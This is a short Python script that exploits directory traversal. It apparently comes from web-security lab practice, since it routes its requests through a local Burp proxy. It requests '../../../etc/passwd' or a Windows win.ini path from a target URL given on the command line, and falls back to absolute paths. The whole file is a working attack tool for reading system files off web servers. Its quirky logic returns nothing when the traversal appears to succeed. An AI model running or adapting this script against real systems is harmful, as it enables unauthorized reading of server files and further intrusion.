import requests
import urllib3
import sys

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def dir_traversal(url):
    os_type = input("Press 1 for *nix or 2 for Windows: ")
    if os_type == '1':
        # Attempt to pull /etc/passwd
        r = requests.get(url + '../../../etc/passwd', proxies=proxies, verify=False)
        if 'file' in r.text:
            attempt_abs_path = input("Traversal failed, attempt absolute path (Y or N)? ")
            if attempt_abs_path == 'Y':
                r_abs = requests.get(url + '/etc/passwd', proxies=proxies, verify=False)
                return r_abs.text
            else:
                return r.text
            
    elif os_type == '2':
        # Attempt to pull windows/win.ini
        r =requests.get(url + '..\..\..\windows\win.ini', proxies=proxies, verify=False)
        if 'file' in r.text:
            attempt_abs_path = input("Traversal failed, attempt absolute path (Y or N)? ")
            if attempt_abs_path == 'Y':
                r_abs = requests.get(url + '/windows/win.ini', proxies=proxies, verify=False)
                return r_abs.text
            else:
                return r.text
    else:
        print('[-] Invalid selection - exiting.')
        sys.exit(-1)
    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com/image?filename=')
        sys.exit(-1)
    
    print('[-] Attempting simple directory traversal')
    exploit = dir_traversal(url)
    print(exploit)
